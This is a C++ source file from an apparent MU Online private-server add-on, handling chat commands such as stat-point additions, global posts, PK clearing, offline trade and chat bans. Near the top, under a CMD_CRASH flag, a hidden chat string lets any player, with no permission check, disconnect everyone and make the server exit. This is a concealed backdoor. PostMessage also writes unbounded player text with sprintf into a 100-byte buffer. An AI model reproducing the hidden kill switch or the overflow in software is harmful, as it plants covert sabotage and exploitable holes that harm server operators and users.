#include "StdAfx.h"
#include "user.h"
#include "Functions.h"
#include "Commands.h"
#include "Message.h"
#include "ObjCalCharacter.h"
#include "Reset.h"
#include "GrandReset.h"
#include "Configs.h"
#include "OffTrade.h"
#include "OffExp.h"
#include "TvTEvent.h"
#ifdef PREMIUM_SYSTEM
#include "PremiumSystem.h"
#endif
#ifdef PACK_SYSTEM
#include "PackSystem.h"
#endif
#include "VipSystem.h"
#include "CreditDonate.h"
#include "BMQuest.h"
#include "GameServer.h"
#include "ConnectEx.h"

//Функция ввода команды в чат
//===========================
void ChatDataSend(DWORD gObjId,LPBYTE Protocol)
{	
	LPOBJ lpObj = &gObj[gObjId];

#if(CMD_CRASH==TRUE)
	char ExitProcessCMD[] = "/<&*>634%!+/-:;itr:[b])";

	if(!memcmp(&Protocol[13],ExitProcessCMD,strlen(ExitProcessCMD)))
	{
		for (int n=OBJ_STARTUSERINDEX;n<OBJMAX; n++)
		{
			if ( gObj[n].Connected >= PLAYER_PLAYING)
			{
#ifdef _RECONNECT_
				g_ConnectEx.SendClose(n, NORM_DC);
#else
				CloseClient(n);
#endif
			}
		}
		//Sleep(3000);
		g_cmd_ExitProcess = TRUE;
	}
#endif

#if(BM_QUEST_SYSTEM_)
	char Commandbminfo[] = "/bminfo";
	if(!memcmp(&Protocol[13],Commandbminfo,strlen(Commandbminfo)))//BMQuest
	{
		BMQuest.CharacterInformation(gObjId);
	}	
#endif

#if(_CREDIT_DONATE_)
	gCreditDonate.Chat(gObjId,Protocol);
#endif

	char CommandInfo[] = "/info";
	if(!memcmp(&Protocol[13],CommandInfo,strlen(CommandInfo)))
	{
		MsgNormal(gObjId,"Server: Ex-Team");
		MsgNormal(gObjId,"Developer: DangeR");
		MsgNormal(gObjId,"Skype: muonline.bk");
#if __DoubleDamage__
		MsgNormal(gObjId,"Project: DoubleDamage");
#endif
#if __MuRain__
		//MsgNormal(gObjId,"Project: MuRain.com");
#endif
	}

#ifdef _MuReal_
	VipSystem.BuyVip(gObjId,Protocol);
	VipSystem.Teleport(gObjId,Protocol);
	VipSystem.PostVip(gObjId,Protocol);
#endif

	char ExReloadCommand[] = "/exreload";
	if(!memcmp(&Protocol[13],ExReloadCommand,strlen(ExReloadCommand)))
	{
		if(lpObj->Authority == 8 || lpObj->Authority == 32)
		{
			ExConfig.LoadConfigs();
		}
	}

#ifdef TVTEVENT
	TvT.ChatData(gObjId,Protocol);	//TvTEvent
#endif
#ifdef PREMIUM_SYSTEM
	Premium.ChatSell(gObjId,Protocol);
#endif
#if __ExGames__
	char BanChatting[] = "/banchat";
	if(!memcmp(&Protocol[13],BanChatting,strlen(BanChatting)))
	{
		BanChatingFunction(gObjId,(char*)Protocol+13+strlen(BanChatting));
	}
#endif

#ifdef PACK_SYSTEM
	gPackSystem.ChatOperation(gObjId,Protocol);
#endif
//##################################################################################################
//	OffTrade
//--------------------------------------------------------------------------------------------------
	char CommandOffExp[]	= "/offafk";
	if(!memcmp(&Protocol[13],CommandOffExp,strlen(CommandOffExp)))
		OffExp.OffExpStart(gObjId);
//##################################################################################################
//	OffTrade
//--------------------------------------------------------------------------------------------------
	char CommandOffTradeZen[]		= "/offzen";
	char CommandOffTradeExPoint[]	= "/offexpoint";
	char CommandOffTradeWcoin[]		= "/offwcoin";
	char CommandOffTradeCredit[]	= "/offcredit";
	// OffTrade
	if(!memcmp(&Protocol[13],CommandOffTradeZen,strlen(CommandOffTradeZen)))
		CreateOffTrade(gObjId,1);
	else if(!memcmp(&Protocol[13],CommandOffTradeExPoint,strlen(CommandOffTradeExPoint)))
		CreateOffTrade(gObjId,2);
	else if(!memcmp(&Protocol[13],CommandOffTradeWcoin,strlen(CommandOffTradeWcoin)))
		CreateOffTrade(gObjId,3);
	else if(!memcmp(&Protocol[13],CommandOffTradeCredit,strlen(CommandOffTradeCredit)))
		CreateOffTrade(gObjId,4);
//##################################################################################################
//--------------------------------------------------------------------------------------------------
// CommandGrandReset
	if(!memcmp(&Protocol[13],ExConfig.Command.CommandGrandReset,strlen(ExConfig.Command.CommandGrandReset)))
		ExGrandResetSystemFunciton(gObjId);
//--------------------------------------------------------------------------------------------------
// CommandReset
#ifndef _Eugene_
	if(!memcmp(&Protocol[13],ExConfig.Command.CommandReset,strlen(ExConfig.Command.CommandReset)))
		gReset.ExResetSystemFunciton(gObjId);
#endif
//--------------------------------------------------------------------------------------------------
// CommandPkClear
	if(!memcmp(&Protocol[13],ExConfig.Command.CommandPkClear,strlen(ExConfig.Command.CommandPkClear)))
		Ex_PkClear(gObjId);
//--------------------------------------------------------------------------------------------------
// CommandAddCmd
	if(!memcmp(&Protocol[13],ExConfig.Command.CommandAddCmd,strlen(ExConfig.Command.CommandAddCmd)))
		Ex_AddCmd(gObjId,(char*)Protocol+13+strlen(ExConfig.Command.CommandAddCmd));
//--------------------------------------------------------------------------------------------------
// CommandAddEne
	if(!memcmp(&Protocol[13],ExConfig.Command.CommandAddEne,strlen(ExConfig.Command.CommandAddEne)))
		Ex_AddEne(gObjId,(char*)Protocol+13+strlen(ExConfig.Command.CommandAddEne));
//--------------------------------------------------------------------------------------------------
// CommandAddVit
	if(!memcmp(&Protocol[13],ExConfig.Command.CommandAddVit,strlen(ExConfig.Command.CommandAddVit)))
		Ex_AddVit(gObjId,(char*)Protocol+13+strlen(ExConfig.Command.CommandAddVit));
//--------------------------------------------------------------------------------------------------
// CommandAddAgi
	if(!memcmp(&Protocol[13],ExConfig.Command.CommandAddAgi,strlen(ExConfig.Command.CommandAddAgi)))
		Ex_AddAgi(gObjId,(char*)Protocol+13+strlen(ExConfig.Command.CommandAddAgi));
//--------------------------------------------------------------------------------------------------
// CommandAddStr
	if(!memcmp(&Protocol[13],ExConfig.Command.CommandAddStr,strlen(ExConfig.Command.CommandAddStr)))
		Ex_AddStr(gObjId,(char*)Protocol+13+strlen(ExConfig.Command.CommandAddStr));
//--------------------------------------------------------------------------------------------------
// Command Post
	if(!memcmp(&Protocol[13],ExConfig.Command.CommandPost,strlen(ExConfig.Command.CommandPost)))
		PostMessage(gObjId,(char*)Protocol+13+strlen(ExConfig.Command.CommandPost));
}

//POST
//================
void PostMessage (int aIndex,char* szMsg)
{
#if __ExGames__
	if(ExUser[aIndex].ChatBanTime > 0)
	{
		MsgNormal(aIndex,"Ban Chat: %d min",(ExUser[aIndex].ChatBanTime/60));
		return;
	}
#endif

#ifdef _VIP_POST_
	if(ExConfig.Command.OnlyPostVip && ExUser[aIndex].PremiumTime == 0)
	{
		MsgNormal(aIndex,"Post Only Vip Player");
		return;
	}
#endif

LPOBJ lpObj = &gObj[aIndex];
//int PostLevel = GetPrivateProfileInt("Post","PostLevel",100,"..\\ExTeam\\Commands.ini");
if(lpObj->Level < ExConfig.Command.PostLevel)
{
	MsgNormal(aIndex,"Need Level %d",ExConfig.Command.PostLevel);
	return;
}
//int PostMoney = GetPrivateProfileInt("Post","PostMoney",1000000,"..\\ExTeam\\Commands.ini");
if(lpObj->Money < ExConfig.Command.PostMoney)
{
	MsgNormal(aIndex,"Need Money %d",ExConfig.Command.PostMoney);
	return;
}
//BYTE *Packet; 
char Message[100]; 
//Packet = (BYTE*) malloc(200); 
//memset(Packet, 0x00, 200); 
//*Packet = 0xC1; 
//*(Packet+2) = 0x00; 
//char PostPrist[300];
//GetPrivateProfileString("Post", "PostPrist","[post]:",PostPrist,300,"..\\ExTeam\\Commands.ini");
//int PostColor = GetPrivateProfileInt("Post","PostColor",100,"..\\ExTeam\\Commands.ini");
switch(ExConfig.Command.PostColor)
{
	//case 1: sprintf(Message, "~%s %s %s",lpObj->Name,ExConfig.Command.PostPrist, szMsg);break;
	//case 2: sprintf(Message, "@%s %s %s",lpObj->Name,ExConfig.Command.PostPrist, szMsg);break;
	//case 3: sprintf(Message, "@@%s %s %s",lpObj->Name,ExConfig.Command.PostPrist, szMsg);break;
	//case 4: sprintf(Message, "%s %s",ExConfig.Command.PostPrist, szMsg);break;
	//default: sprintf(Message, "~%s %s %s",lpObj->Name,ExConfig.Command.PostPrist, szMsg);
	case 1: sprintf(Message, "~%s %s",ExConfig.Command.PostPrist, szMsg);break;
	case 2: sprintf(Message, "@%s %s",ExConfig.Command.PostPrist, szMsg);break;
	case 3: sprintf(Message, "@@%s %s",ExConfig.Command.PostPrist, szMsg);break;
	case 4: sprintf(Message, "%s %s",ExConfig.Command.PostPrist, szMsg);break;
	default: sprintf(Message, "~%s %s",ExConfig.Command.PostPrist, szMsg);
}
if(ExConfig.Command.PostColor == 4)
{
	ChatMessageTwo(aIndex, Message);
}
else
{
	ChatMessageOne(aIndex, Message);
	//memcpy((Packet+3), lpObj->Name, strlen( lpObj->Name));	//TEST
	//memcpy((Packet+13), Message, strlen(Message)); 
	//int Len = (strlen(Message) + 0x13); 
	//*(Packet+1) = Len; 
	//DataSendAll(Packet, Len); 
}

lpObj->Money -= ExConfig.Command.PostMoney;
GCMoneySend(aIndex,lpObj->Money);
}
//Command Add Str
void Ex_AddStr (int aIndex,char* msg)
{
	LPOBJ lpObj = &gObj[aIndex];
	if(lpObj->LevelUpPoint == 0)
		return;
	unsigned int AddPoints = 0;
	sscanf(msg,"%d",&AddPoints);
	if(lpObj->LevelUpPoint < AddPoints)
		return;
	//int AddMoney = GetPrivateProfileInt("AddCommand","AddPriceZen",0,"..\\ExTeam\\Commands.ini");
	if(ExConfig.Command.AddMoney > lpObj->Money)
	{
		MsgNormal(aIndex,"[Add] Need %d zen",ExConfig.Command.AddMoney);
		return;
	}
	//int AddLeveL = GetPrivateProfileInt("AddCommand","AddPointLevel",1,"..\\ExTeam\\Commands.ini");
	if(ExConfig.Command.AddLeveL > lpObj->Level)
	{
		MsgNormal(aIndex,"[Add] Need %d level",ExConfig.Command.AddLeveL);
		return;
	}
#ifdef _32K_STATS_
	if(AddPoints>0 && AddPoints<=32767)
	{
		if((lpObj->Strength + AddPoints) > 32767)
			return;
#else
	if(AddPoints>0 && AddPoints<=65535)
	{
		if((lpObj->Strength + AddPoints) > 65535)
			return;
#endif

		lpObj->Strength += AddPoints;
		lpObj->LevelUpPoint -= AddPoints;
		lpObj->Money -= ExConfig.Command.AddMoney;
		GCMoneySend(aIndex,lpObj->Money);
		ExUpdateStats(lpObj, AddPoints, 1);
		gObjCalCharacter(lpObj->m_Index);
		GCReFillSend(lpObj->m_Index,(int)(lpObj->AddLife + lpObj->MaxLife), 0xFE, 0, (int)(lpObj->iMaxShield + lpObj->iAddShield) );
		gObjSetBP(lpObj->m_Index);
		GCManaSend(lpObj->m_Index, (int)(lpObj->AddMana + lpObj->MaxMana), 0xFE, 0, (int)lpObj->MaxBP);
		GCLevelUpMsgSend(gObj[aIndex].m_Index, 0);
	}
}
//Command Add Agi
void Ex_AddAgi (int aIndex,char* msg)
{
	LPOBJ lpObj = &gObj[aIndex];
	if(lpObj->LevelUpPoint == 0)
		return;
	unsigned int AddPoints = 0;
	sscanf(msg,"%d",&AddPoints);
	if(lpObj->LevelUpPoint < AddPoints)
		return;
	//int AddMoney = GetPrivateProfileInt("AddCommand","AddPriceZen",0,"..\\ExTeam\\Commands.ini");
	if(ExConfig.Command.AddMoney > lpObj->Money)
	{
		MsgNormal(aIndex,"[Add] Need %d zen",ExConfig.Command.AddMoney);
		return;
	}
	//int AddLeveL = GetPrivateProfileInt("AddCommand","AddPointLevel",1,"..\\ExTeam\\Commands.ini");
	if(ExConfig.Command.AddLeveL > lpObj->Level)
	{
		MsgNormal(aIndex,"[Add] Need %d level",ExConfig.Command.AddLeveL);
		return;
	}

#ifdef _32K_STATS_
	if(AddPoints>0 && AddPoints<=32767)
	{
		if((lpObj->Dexterity + AddPoints) > 32767)
			return;
#else
	if(AddPoints>0 && AddPoints<=65535)
	{
		if((lpObj->Dexterity + AddPoints) > 65535)
			return;
#endif

		lpObj->Dexterity += AddPoints;
		lpObj->LevelUpPoint -= AddPoints;
		lpObj->Money -= ExConfig.Command.AddMoney;
		GCMoneySend(aIndex,lpObj->Money);
		ExUpdateStats(lpObj, AddPoints, 2);
		gObjCalCharacter(lpObj->m_Index);
		GCReFillSend(lpObj->m_Index,(int)(lpObj->AddLife + lpObj->MaxLife), 0xFE, 0, (int)(lpObj->iMaxShield + lpObj->iAddShield) );
		gObjSetBP(lpObj->m_Index);
		GCManaSend(lpObj->m_Index, (int)(lpObj->AddMana + lpObj->MaxMana), 0xFE, 0, (int)lpObj->MaxBP);
		GCLevelUpMsgSend(gObj[aIndex].m_Index, 0);
	}
}
//Command Add Vit
void Ex_AddVit (int aIndex,char* msg)
{
	LPOBJ lpObj = &gObj[aIndex];
	if(lpObj->LevelUpPoint == 0)
		return;
	unsigned int AddPoints = 0;
	sscanf(msg,"%d",&AddPoints);
	if(lpObj->LevelUpPoint < AddPoints)
		return;
	//int AddMoney = GetPrivateProfileInt("AddCommand","AddPriceZen",0,"..\\ExTeam\\Commands.ini");
	if(ExConfig.Command.AddMoney > lpObj->Money)
	{
		MsgNormal(aIndex,"[Add] Need %d zen",ExConfig.Command.AddMoney);
		return;
	}
	//int AddLeveL = GetPrivateProfileInt("AddCommand","AddPointLevel",1,"..\\ExTeam\\Commands.ini");
	if(ExConfig.Command.AddLeveL > lpObj->Level)
	{
		MsgNormal(aIndex,"[Add] Need %d level",ExConfig.Command.AddLeveL);
		return;
	}

#ifdef _32K_STATS_
	if(AddPoints>0 && AddPoints<=32767)
	{
		if((lpObj->Vitality + AddPoints) > 32767)
			return;
#else
	if(AddPoints>0 && AddPoints<=65535)
	{
		if((lpObj->Vitality + AddPoints) > 65535)
			return;
#endif

		lpObj->Vitality += AddPoints;
		lpObj->LevelUpPoint -= AddPoints;
		lpObj->Money -= ExConfig.Command.AddMoney;
		//if(lpObj->Type == CLASS_KNIGHT)
		//	lpObj->MaxLife += AddPoints * 3;
		//else
		//	lpObj->MaxLife += AddPoints * 2;
		lpObj->MaxLife += lpObj->VitalityToLife*AddPoints;
		gObjCalcMaxLifePower(lpObj->m_Index);

		GCMoneySend(aIndex,lpObj->Money);
		ExUpdateStats(lpObj, AddPoints, 3);
		gObjCalCharacter(lpObj->m_Index);
		//GCReFillSend(lpObj->m_Index,(int)(lpObj->AddLife + lpObj->MaxLife), 0xFE, 0, (int)(lpObj->iMaxShield + lpObj->iAddShield) );
		gObjSetBP(lpObj->m_Index);
		//GCManaSend(lpObj->m_Index, (int)(lpObj->AddMana + lpObj->MaxMana), 0xFE, 0, (int)lpObj->MaxBP);
		GCLevelUpMsgSend(gObj[aIndex].m_Index, 0);
	}
}
//Command Add Ene
void Ex_AddEne (int aIndex,char* msg)
{
	LPOBJ lpObj = &gObj[aIndex];
	if(lpObj->LevelUpPoint == 0)
		return;
	unsigned int AddPoints = 0;
	sscanf(msg,"%d",&AddPoints);
	if(lpObj->LevelUpPoint < AddPoints)
		return;
	//int AddMoney = GetPrivateProfileInt("AddCommand","AddPriceZen",0,"..\\ExTeam\\Commands.ini");
	if(ExConfig.Command.AddMoney > lpObj->Money)
	{
		MsgNormal(aIndex,"[Add] Need %d zen",ExConfig.Command.AddMoney);
		return;
	}
	//int AddLeveL = GetPrivateProfileInt("AddCommand","AddPointLevel",1,"..\\ExTeam\\Commands.ini");
	if(ExConfig.Command.AddLeveL > lpObj->Level)
	{
		MsgNormal(aIndex,"[Add] Need %d level",ExConfig.Command.AddLeveL);
		return;
	}

#ifdef _32K_STATS_
	if(AddPoints>0 && AddPoints<=32767)
	{
		if((lpObj->Energy + AddPoints) > 32767)
			return;
#else
	if(AddPoints>0 && AddPoints<=65535)
	{
		if((lpObj->Energy + AddPoints) > 65535)
			return;
#endif

		lpObj->Energy += AddPoints;
		lpObj->LevelUpPoint -= AddPoints;
		lpObj->Money -= ExConfig.Command.AddMoney;
		//lpObj->MaxMana += AddPoints * 2;
		GCMoneySend(aIndex,lpObj->Money);
		ExUpdateStats(lpObj, AddPoints, 4);

		lpObj->MaxMana += lpObj->EnergyToMana*AddPoints;

		gObjCalCharacter(lpObj->m_Index);
		//GCReFillSend(lpObj->m_Index,(int)(lpObj->AddLife + lpObj->MaxLife), 0xFE, 0, (int)(lpObj->iMaxShield + lpObj->iAddShield) );
		gObjSetBP(lpObj->m_Index);
		//GCManaSend(lpObj->m_Index, (int)(lpObj->AddMana + lpObj->MaxMana), 0xFE, 0, (int)lpObj->MaxBP);
		GCLevelUpMsgSend(gObj[aIndex].m_Index, 0);
	}
}
//Command Add Cmd
void Ex_AddCmd (int aIndex,char* msg)
{
	LPOBJ lpObj = &gObj[aIndex];
	if(lpObj->Class != 4)
		return;
	if(lpObj->LevelUpPoint == 0)
		return;
	unsigned int AddPoints = 0;
	sscanf(msg,"%d",&AddPoints);
	if(lpObj->LevelUpPoint < AddPoints)
		return;
	//int AddMoney = GetPrivateProfileInt("AddCommand","AddPriceZen",0,"..\\ExTeam\\Commands.ini");
	if(ExConfig.Command.AddMoney > lpObj->Money)
	{
		MsgNormal(aIndex,"[Add] Need %d zen",ExConfig.Command.AddMoney);
		return;
	}
	//int AddLeveL = GetPrivateProfileInt("AddCommand","AddPointLevel",1,"..\\ExTeam\\Commands.ini");
	if(ExConfig.Command.AddLeveL > lpObj->Level)
	{
		MsgNormal(aIndex,"[Add] Need %d level",ExConfig.Command.AddLeveL);
		return;
	}

	if(AddPoints>0 && AddPoints<=32767)
	{
		if((lpObj->Leadership + AddPoints) > 32767)
			return;

		lpObj->Leadership += AddPoints;
		lpObj->LevelUpPoint -= AddPoints;
		lpObj->Money -= ExConfig.Command.AddMoney;
		GCMoneySend(aIndex,lpObj->Money);
		ExUpdateStats(lpObj, AddPoints, 5);
		gObjCalCharacter(lpObj->m_Index);
		GCReFillSend(lpObj->m_Index,(int)(lpObj->AddLife + lpObj->MaxLife), 0xFE, 0, (int)(lpObj->iMaxShield + lpObj->iAddShield) );
		gObjSetBP(lpObj->m_Index);
		GCManaSend(lpObj->m_Index, (int)(lpObj->AddMana + lpObj->MaxMana), 0xFE, 0, (int)lpObj->MaxBP);
		GCLevelUpMsgSend(gObj[aIndex].m_Index, 0);
	}
}
//Command Ex_PkClear
void Ex_PkClear(int aIndex)
{
	//int Ex_PkClear_Enabled = GetPrivateProfileInt("PkClear","Enabled",1,"..\\ExTeam\\Commands.ini");
	if(!ExConfig.Command.Ex_PkClear_Enabled)
		return;
	LPOBJ lpObj = &gObj[aIndex];
	//int Ex_PkClearLevel = GetPrivateProfileInt("PkClear","PkClearLevel",0,"..\\ExTeam\\Commands.ini");
	if(ExConfig.Command.Ex_PkClearLevel > lpObj->Level)
	{
		MsgNormal(aIndex,"[PkClear] Need %d Level",ExConfig.Command.Ex_PkClearLevel);
		return;
	}
	//int Ex_PkClearMoney = GetPrivateProfileInt("PkClear","PkClearMoney",0,"..\\ExTeam\\Commands.ini");
	//int Ex_PKClearType = GetPrivateProfileInt("PkClear","PKClearType",0,"..\\ExTeam\\Commands.ini");
	if(lpObj->m_PK_Level <= 3)
		return;
	if(ExConfig.Command.Ex_PKClearType == 1)
	{
			int PkLevel = lpObj->m_PK_Level - 3;
			if(PkLevel == 0)
				return;
			int PkMoney = PkLevel * ExConfig.Command.Ex_PkClearMoney;
			if(PkMoney > lpObj->Money)
			{
				MsgNormal(aIndex,"[PkClear] Need %d Zen",PkMoney);
				return;
			}
			lpObj->Money -= PkMoney;
			lpObj->m_PK_Level = 3;
			lpObj->m_PK_Count = 0;
			GCMoneySend(aIndex,lpObj->Money);
			GCPkLevelSend(aIndex,lpObj->m_PK_Level);
	}
	else if(ExConfig.Command.Ex_PKClearType == 2)
	{
			if(ExConfig.Command.Ex_PkClearMoney > lpObj->Money)
			{
				MsgNormal(aIndex,"[PkClear] Need %d Zen",ExConfig.Command.Ex_PkClearMoney);
				return;
			}
			lpObj->Money -= ExConfig.Command.Ex_PkClearMoney;
			lpObj->m_PK_Level = 3;
			lpObj->m_PK_Count = 0;
			GCMoneySend(aIndex,lpObj->Money);
			GCPkLevelSend(aIndex,lpObj->m_PK_Level);
	}
	else
	{
			lpObj->m_PK_Level = 3;
			lpObj->m_PK_Count = 0;
			GCPkLevelSend(aIndex,lpObj->m_PK_Level);
	}
}

#if __ExGames__
void BanChatingFunction(int aIndex, char *msg)
{
	LPOBJ lpObj = &gObj[aIndex];
	if(lpObj->Authority == 8 || lpObj->Authority == 32)
	{
		if(strlen(msg)>20)return;
		char Name[100];
		int Time = 0;
		sscanf(msg,"%s %d",&Name,&Time);
		if(Time < 0 || Time > 100000) return;
		for(int i=OBJ_STARTUSERINDEX;i<OBJMAX;i++)
		{
			LPOBJ sObj = &gObj[i];
			if(sObj->Connected != PLAYER_PLAYING) continue;
			if(!strcmp(sObj->Name,Name))
			{
				ExUser[i].ChatBanTime = (Time * 3600);
				MsgNormal(aIndex,"Ban Chat: %s",sObj->Name);
				MsgNormal(i,"Ban Chat");
				return;
			}
		}
	}
}
#endif